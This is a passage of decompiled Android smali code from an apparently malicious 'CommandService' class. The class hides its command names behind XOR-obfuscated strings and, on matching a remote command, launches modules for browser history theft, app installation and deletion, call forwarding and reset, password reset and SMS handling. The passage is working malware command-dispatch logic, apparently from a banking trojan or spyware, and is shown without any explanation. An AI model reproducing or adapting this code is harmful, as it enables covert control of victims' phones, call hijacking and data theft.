    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_3
    aget-object v0, v4, v1

    const-string v5, "N$})`2}.{("

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_4

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/GetHistory;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_4
    aget-object v0, v4, v1

    const-string v5, "\u0014y%h5laK.}2"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_5

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "S8Z;M3]k"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "u5l9}|"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aget-object v5, v4, v1

    const-string v6, "\"J.[k"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    sget-object v6, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v8, v5, v11

    invoke-virtual {v7, v2, v8}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v6, Landroid/content/Intent;

    const-class v7, Lcompse/refact/st/upsssss/InstallApp;

    invoke-direct {v6, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v7, "\u0014[\r"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iget-object v8, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v6

    const-string v7, "%[$"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    aget-object v8, v5, v11

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v6

    const-string v7, "/|,"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v6

    invoke-virtual {v6, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v7, ""

    invoke-virtual {p0, v6}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "%[$"

    invoke-static {v8}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v2, v8}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    aget-object v5, v5, v11

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const-string v5, ""

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "/|,"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v2, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_5
    aget-object v0, v4, v1

    const-string v5, "|\"N$[\tn:C\u0017_&"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_6

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/AllApp;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0014[\r"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_6
    aget-object v0, v4, v1

    const-string v5, "|3A2p5N:Ck"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_7

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v5, v2, v6}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "-f&\'1a1"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "_k"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v2, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v9, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v2, v9}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "u\u0012l/maj e-(="

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v5, v6}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "*|3A2p5N:Ck"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "=g4d#l3z5"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/CallNumberSend;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "\u0003}\u001a"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v5, v6, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v6, "2}3"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_7
    aget-object v0, v4, v1

    const-string v5, "\u0010@$X7]2p5N:Ck"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_8

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v5, v2, v6}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "-f&\'1a1"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "_k"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v2, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v9, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v2, v9}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "=O.{6h3maj e-(="

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v5, v6}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "S\u0010@$X7]2p5N:Ck"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "u\'f3~ {%z5"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/ForvardCall;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "%[$"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_8
    aget-object v0, v4, v1

    const-string v5, "[$z\u0007f3~ {%V\"h-e|"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_9

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v5, v2, v6}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":@1\u0001&G&"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "y|"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v2, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v9, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v2, v9}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "S\u0004J%J\"\u000f\u0015N:Cvi9]!N$K?A1\u000e*"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v5, v6}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "u\u0007f3~ {%V\"h-e|"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "S0@$X7]2\\\""

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/ResetCallForwarding;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "2}3"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_9
    aget-object v0, v4, v1

    const-string v5, "h9p\u001aJ7K?A1p$J\'Z3\\\""

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_a

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/Leading;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0014[\r"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_a
    aget-object v0, v4, v1

    const-string v5, "h9p\u0006N%\\!@$K%"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_b

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/resetPassword;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_b
    aget-object v0, v4, v1

    const-string v5, "\u0005l-l5l\u0000y1"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_c

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/DeleteApps;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_c
    aget-object v0, v4, v1

    const-string v5, "\u0011@\t|;\\;A2"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_d

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/SmsMnd/Smsmnd;

